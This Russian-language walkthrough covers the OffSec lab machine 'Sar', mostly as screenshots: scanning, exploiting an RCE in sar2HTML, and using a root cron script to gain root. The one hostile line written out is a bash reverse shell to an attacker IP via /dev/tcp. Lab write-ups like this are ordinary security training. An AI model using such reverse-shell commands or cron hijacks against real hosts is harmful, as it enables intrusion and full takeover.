# Offensive Security: Sar

Для начала произведем сканирование целевого хоста при помощи Nmap:

```sh
nmap -sC -sV -p- 192.168.246.35
```

![ScreenShot](screenshots/1.png)

Найдено:
- 22 port - SSH (OpenSSH 7.6p1)
- 80 port - HTTP (Apache/2.4.29)

Осмотрим сайт:

![ScreenShot](screenshots/2.png)

Сканируем директории:

![ScreenShot](screenshots/3.png)

Заходим на `robots.txt`:

![ScreenShot](screenshots/4.png)

Находим сервис `sar2HTML`:

![ScreenShot](screenshots/5.png)

Директория с файлами:

![ScreenShot](screenshots/6.png)

Поищем эксплойты:

![ScreenShot](screenshots/7.png)

RCE... Весело! Копируем сплойт на рабочий стол для удобства:

![ScreenShot](screenshots/8.png)

Запускаем:

![ScreenShot](screenshots/9.png)

Сделаем reverse shell через `php-reverse-shell.php`. Этот файл скопирован на рабочий стол из `/usr/share/webshells/php/php-reverse-shell.php`. Настраиваем:

![ScreenShot](screenshots/10.png)

Открываем HTTP сервер средствами python:

![ScreenShot](screenshots/11.png)

Проверяем, что файл доступен на сервере:

![ScreenShot](screenshots/12.png)

Скачиваем скрипт на атакуемый компьютер:

![ScreenShot](screenshots/13.png)

Прослушиваем порт:

![ScreenShot](screenshots/14.png)

Активируем скрипт:

![ScreenShot](screenshots/15.png)

Получаем оболочку:

![ScreenShot](screenshots/16.png)

Первый флаг:

![ScreenShot](screenshots/17.png)

Дальше кинем `linpeas.sh` на наш python-сервер и затем на атакуемый хост:

![ScreenShot](screenshots/18.png)

Скачиваем с нашего сервера файл `linpeas.sh`:

![ScreenShot](screenshots/19.png)

![ScreenShot](screenshots/20.png)

Запускаем скрипт:

![ScreenShot](screenshots/21.png)

Находим артефакт в `crontab`:

![ScreenShot](screenshots/22.png)

Находим файл `finally.sh` и `write.sh`:

![ScreenShot](screenshots/23.png)

Получается следующая картина - мы записываем `'bash -c "bash -i >& /dev/tcp/192.168.45.165/5555 0>&1"'` в `write.sh`, который затем запускается в `finally.sh`, который имеет права `root`, значит и оболочку мы должны получить от пользователя `root`. Слушаем второй порт:

![ScreenShot](screenshots/24.png)

Запись в файл `write.sh`:

![ScreenShot](screenshots/25.png)

Тут я немного ошибся и перезаписал файл:

![ScreenShot](screenshots/26.png)

Через некоторое время `crontab` выполнит действие по запуску файла и мы получим оболочку, а также второй флаг:

![ScreenShot](screenshots/27.png)

---
